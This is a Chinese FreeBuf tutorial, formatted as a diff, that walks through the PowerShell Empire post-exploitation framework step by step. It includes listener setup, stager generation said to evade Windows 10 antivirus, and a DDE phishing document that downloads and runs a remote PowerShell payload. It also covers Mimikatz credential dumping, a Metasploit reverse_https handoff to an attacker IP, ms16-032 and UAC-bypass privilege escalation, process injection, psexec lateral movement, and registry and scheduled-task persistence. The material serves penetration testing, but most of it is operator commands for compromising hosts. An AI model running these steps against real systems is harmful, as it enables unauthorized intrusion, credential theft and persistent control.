@@ -1,0 +1,114 @@
+*本文原创作者：FK_T，本文属FreeBuf原创奖励计划，未经许可禁止转载
+前言
+PowerShsell Empire中文简称 "帝国" ，可能大多数只听说过这款内网渗透神器，针对windows系统平台而打造的一款渗透工具。在PowerShell方面，帝国实现了无需powershell.exe即可运行PowerShell代理的功能，可快速部署的开发后的模块从按键记录到Mimikatz，可逃避网络检测的能力，适应性强的通信，都包裹在易用性为重点的框架,有点类似于像meterpreter。
+Empire详情介绍参考官方网站:http://powershellempire.com/
+00X1
+Empire运行在linux平台上,不要试图使用centos环境,安装前我们先看看install.sh脚本,建议使用Debian或Ubuntu,以及kali Linux系统,我使用的是系统是Ubuntu系统
+git clone https://github.com/EmpireProject/Empire.git
+进入Empire/setup目录安装./install.sh，install.sh脚本里面包含了很多远程下载包,安装过程比较缓慢。
+sudo./install.sh
+安装到这就已经结束了,末尾让我们输入随机生成的服务协商密码,直接回车就行了。
+目前最新版本可以到的是2.3包含282个模块,和之前的,2.x之后有些使用方法以及命令都有了很大的区别,官网也没有给出更新介绍使用。
+输入help查看Empire使用帮助信息
+FreeBug有位前辈之前也发了篇关于Empire的文章,Empire2.x 后使用不太一样,可能前辈细节部分没有说清楚具体怎么操作,评论后面一排的有关使用操作问题，主要是细节用法方面, 也是写这篇文章初心之一,文章都是在不同的环境下进行的不过操作方法都是一样的。
+使用方法跟Meterpreter原理是一样的,先设置一个监听,这里要注意了,输入"listeners"它提示说没有建立监听,
+输入uselistener空格按下Tab键可以看到有7种模式
+设置一个监听模块为http,这样就可以了
+(Empire:listeners) > uselistener http (Empire: listeners/http) >
+然后在输入就能info查看具体参数设置
+使用set命令可以设置相应参数,修改Name和Host，同样的也可以使用help查看相关命令,然后输入execute命令开始监听。
+set Name xiaobai (名字随便填) set Host ip (Empir所在服务器IP)
+输入listeners列出当前激活的listener
+(Empire: Listenere/http) > listeners
+这里要注意一点，当开启多个监听的时候，必须使用不同的名称，并且使用不同的端口，如果设置的端口已经被使用，会有已下提示信息。set空格按两下Tab就会出现相关命令 如下图。
+(Empire: Listeners) > kill xiaobai 删除监听使用kill和创建过的Name的名,back返回上一层
+00x2
+生成木马程序
+设置完监听，接着我们要生成木马然后运行stager,同样的输入“uselistener”以后按下空格然后在按下tab键,可以看到总共是26个模块。其中multi为通用模块、osx mac操作系统、另外还有linux与windows模块。 生成的文件类型有.dll,bat，vbs等。
+1.launcher
+实战中直接命令usestager [具体模块]就可以在/tmp目录下生成一个特定文件格式的木马后门，然后通过webshell上传运行就可以了。下面使用launcher+语言类型,不仅有powershell还有python。
+使用launcher（这里是pythonl ）+侦听的名字“xiaobai”,如下图可以看到生成的Payload是经过base64的编码。
+粘贴复制在Linux系统命令行运行即可,agents命令列出当前已激活的代理，“这里注意如果目标主机Username带有（*）的是已提权成功的代理,可通过bypassuac进行提权”，如下目标主机ubuntu已经被控制了。
+同样的使用launcher（这里是 powershell）+侦听的名字“fkt”。
+刚刚使用kill删除了这里在重新设置了下
+直接在目标机器上面执行,就可以得到这个主机的权限，而且杀毒软件没有任何提示
+使用Cobalt Strike生成的未经过编码的PowerShell执行windows10就报毒提示了
+2.agents代理中的使用
+当执行上面的powershell生成的木马上线了就会有这段话(Empire: listeners)> [+] Initial agent xxx from ip now active (Slack) , Name就是上线的主机,使用agents就能看到信息条目,类似meterpreter的session会话一样。
+list stale #列出已丢失反弹代理权
+那么上线之后我们该如何操作,同样的在agents下输入help查看命令帮助。
+(Empire: agents) >help
+使用interact命令跟上刚刚上线的主机Name的名,类似meterpreter中的shell会话一样,也可以直接调用cmd
+（Empire: agents）> interact DUW9GMK8 （Empire: DUW9GMK8）> help
+SC目标截图
+如下图可以看到目标所有机器所在服务器的位置已经下载的文件,还可以使用download下载,upload 上传文件等
+我们直接输入“net user”命令试试,提示使用““帮助”命令agentcmds,很简单的在输入“help agentcmds”就可以查看该命令用法,前面加上一个shell就行,和Cobalt Strike->Interact ->Beacon执行的命令一样。
+#加载mimikatz,需要对带有*的权限才能获取系统账号密码。
+creds #查看所有hash值包括明文
+creds export/root/HE6YWBSZ.csv #出hash凭证到指定的路径的格式
+3.vbs反弹shell代理
+由于之已经设置过了这里只需填写之前监听的名字,execute 执行完了之后会在Empire搭建的服务器上的/tmp/生成个vbs的木马
+拷贝到目标系统，将生成的这个launcher.vbs在目标机上打开，就会得到这个主机的权限,我使用的是windows10系统,自带的杀毒软件没有任何提示如下。
+如果要删除该主机，使用kill或者remove命令，这两个命令是有区别的！
+当你想使用”remove V7EXYZT6“删除这个名发现Empire还是会反弹过来,需要使用kill删除,只有删除了监听器的Name才可以使用remove,类似于“Cobalt Strike”需要先执行”Exit“在执行“Remove”才可以移除。
+4.launcher_bat
+输入usestager windows/launcher_bat命令同样的使用info查看相关参数
+之前已经设置过了Name和Host这里只需要监听下名称就好，最后在执行下execute,默认在服务器上的/tmp/下生成加密过的PowerShelll木马，为launcher_bat
+直接目标机上打开launcher_bat，就可以得到这个主机的权限cmd一闪而过。这就相当于得到一个MSF会话
+5.微软 Office Word 无宏命令执行漏洞
+无需开启宏即可渗透：在Office文档中利用DDE执行命令,利用之前爆的这个漏洞配合Emprie反弹一个会话复现下， "制作详细传送门" 我们把之前使用的(Empire: listeners) > launcherpowershell xiaobai 生成的powershell编码过的攻击代码写入到本地安装的httpd默认安装/var/www/html/demo.ps1路径下
+编写钓鱼文档，调用cmd远程下载执行powershell脚本
+然后在诱导对方点击这里需要触发两次,虚拟机安装了杀软没有任何有关恶意的安全警告
+成功拿到会话如下
+Empire2.3 包含usemodule204个模块
+列出大类模块如下 code_execution #代码执行 collection #信息收集模块、屏幕截图、键盘记录 、剪贴板记录等 credentials #密码凭据的获取和转储 exfiltration #指定ip进行端口扫描 lateral_movement #横向渗透模块 management #用来执行些系统设置，和邮件信息的收集 persistence #权限维持工具 privesc #权限提升 recon #侦察 situational_awareness #评估主机运行环境，网络运行环境 trollsploit #恶作剧
+(Empire: 9x7N513) > usemodule 空格Tba键如下
+00X3
+1.Empire和msf的联动
+想利用Empire派生一个meterpreter的shell回来,与Empire,msf进行配合使用，首先我们需要使用Empire建立一个监听，命令如下
+(Empire:YU6A1TWD) > usemodulecode_execution/invoke_shellcode (Empire: powershell/code_execution/invoke_shellcode)> info
+列出帮助信息
+设置监听的端口以及msfconsole所在的ip
+set Lport 1234 set Lhost 192.168.1.85 execute
+同样的msf也需要设置,通过https的方式反向连接，在网速慢的情况下不稳定，如果反弹没有收到数据，可以将监听端口换成443就可以收到Empire反弹回来的shell了如下。
+Useexploit/multi/handler Set payload windows/meterpreter/reverse_https SetLhost 192.168.1.85 Setlport 1234 exploit
+2. 使用Empire内置模块ms16-032提权
+(Empire: 97KXRTD5) >usemodule privesc/ms16-032 (Empire: powershell/privesc/ms16-032)> set Listener xiaobai (Empire:powershell/privesc/ms16-032) > execute
+同样的这里也要需要设置下Listener如下：
+3.收集目标有用的信息如下
+4.AllChecks模块
+(Empire: 97KXRTD5) > usemoduleprivesc/powerup/allchecks # 检查提权方法
+(Empire:powershell/privesc/powerup/allchecks) > execute
+执行完后，输出可识别的漏洞并列出提权方法,跟PowerShell ，PowerUp.ps1脚本是一样的
+5.UAC 提权模块
+输入usemodule privesc/bypassuac,在设置监听的Name,然后在执行execute,需要目标主机主动点击两次触发,成功反弹一个新的shell会话如下
+输入agents如下Username带星号的即为刚刚提权成功的
+6. arpscan 网络扫描
+Empire内置arpsan模块，在局域网内发送ARP数据包，用来收集活跃主机IP和MAC地址信息
+输入usemodule situational_awareness/network/arpscan
+set Range 192.168.2.0-192.168.2.254 设置要扫描的的网段 execute 执行命令
+7.会话注入得到反弹代理
+(Empire: FD6TGMH7) > usemodulemanagement/psinject (Empire: powershell/management/psinject)> info (Empire: powershell/management/psinject)> set ProcId 2264 (Empire: powershell/management/psinject)> set Listener xiaobai (Empire: powershell/management/psinject)> execute
+选择psinject模块进行会话注入,直接输入ps选择一个进程的PID,使用进程注入模块，来获取权限。需要设置的就是ProcID 和 Listener就好了。
+设置好后执行，会返回一个新的会话
+8.psexec模块横向生成一个反弹代理
+(Empire:powershell/lateral_movement/invoke_psexec) > set ComputerName 192.168.1.116 (Empire:powershell/lateral_movement/invoke_psexec) > set Listener xiaobai (Empire:powershell/lateral_movement/invoke_psexec) > execute
+选择一个带*的目标主机使用invoke_psexec该模块进行横向渗透，设置目标的主机和监听名如下
+成功则反弹一个新的会话权限为system
+00x4 权限维持
+1.registry
+在注册表regedit HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Debug可以看到
+因为是开机启动，所以会弹个黑框,之后还会弹出注册表添加的powershell启动项的框
+2.schtasks
+同样的选择schtasks模块设置下监听名就行,这里还需要设置下DailyTime时间如果不设置默认的是每天早上的9点
+(Empire: DCBL4SUF) > usemodule persistence/elevated/schtasks* (Empire:powershell/persistence/elevated/schtasks) > set Listener xiaobai (Empire:powershell/persistence/elevated/schtasks) >set DailyTime 22:30 （设置时间） (Empire:powershell/persistence/elevated/schtasks) > execute
+在任务计划程序库可以看到-任务为Updater-启动程序如下可以到为powershell
+这里就不等了手动启动下重新反弹一个新的会话
+(Empire: BLWHGFPS) > agents
+第一个是注册表的权限还是不变，第2个为服务任务计划程序库提权之后为ssystem 权限
+总结
+最近工作交接比较忙,笔记本太重了 , 在公司部署好的环境,回来借朋友的电脑重新安装环境,还有些模块功能没写,花了几天时间写到这眼都花了,由于没有域环境,文章中只是介绍了Empirer大致的基本用法，大量的模块都集成在usemodule下，主要还是在于引导,使用方法多用多练就好,才能在实践中灵活的运用,希望通过篇文章对没有接触过的Empire有一个比较全面的了解。
+参考:
+官网WiKi
+渗透神器Empire安装和简单使用
+*本文原创作者：FK_T，本文属FreeBuf原创奖励计划，未经许可禁止转载
